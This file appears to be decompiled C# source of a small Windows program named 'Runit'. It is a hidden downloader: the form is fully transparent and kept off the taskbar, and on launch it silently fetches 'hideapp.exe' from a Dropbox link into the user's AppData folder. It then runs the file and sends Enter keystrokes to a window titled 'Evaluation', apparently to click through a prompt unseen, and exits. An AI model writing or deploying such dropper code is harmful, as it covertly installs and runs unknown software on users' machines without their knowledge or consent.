using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Runit.My;

namespace Runit;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("_web")]
	private WebClient __web;

	public string store;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	public virtual WebClient _web
	{
		get
		{
			return __web;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			AsyncCompletedEventHandler value2 = _web_DownloadFileCompleted;
			if (__web != null)
			{
				__web.DownloadFileCompleted -= value2;
			}
			__web = value;
			if (__web != null)
			{
				__web.DownloadFileCompleted += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		_web = new WebClient();
		store = Environment.UserName;
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Form1);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		components = new Container();
		Button1 = new Button();
		Label1 = new Label();
		Timer1 = new Timer(components);
		Button2 = new Button();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(24, 26);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(68, 30);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Run");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(12, 10);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Label1");
		Timer1.set_Interval(700);
		Button button3 = Button2;
		location = new Point(38, 65);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(2);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(120, 78);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Label1.set_Text(store);
		_web.DownloadFileAsync(new Uri("https://dl.dropboxusercontent.com/s/qtm37gu7ofoel42/hideapp.exe?dl=1&token_hash=AAH_o4gOiO9jVEsARHZjkQMUcZ_koo13pyXrIoOvlV0fqw"), "C:\\Users\\" + store + "\\AppData\\Roaming\\hideapp.exe");
	}

	private void _web_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
	{
		try
		{
			Process.Start("C:\\Users\\" + store + "\\AppData\\Roaming\\hideapp.exe");
			Thread.Sleep(1000);
			Button2.PerformClick();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Button1.PerformClick();
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		Interaction.AppActivate("Evaluation");
		((Computer)MyProject.Computer).get_Keyboard().SendKeys("{ENTER}");
		Thread.Sleep(1000);
		Interaction.AppActivate("Evaluation");
		((Computer)MyProject.Computer).get_Keyboard().SendKeys("{ENTER}");
		Timer1.Start();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Timer1.Stop();
		((Form)this).Close();
	}
}
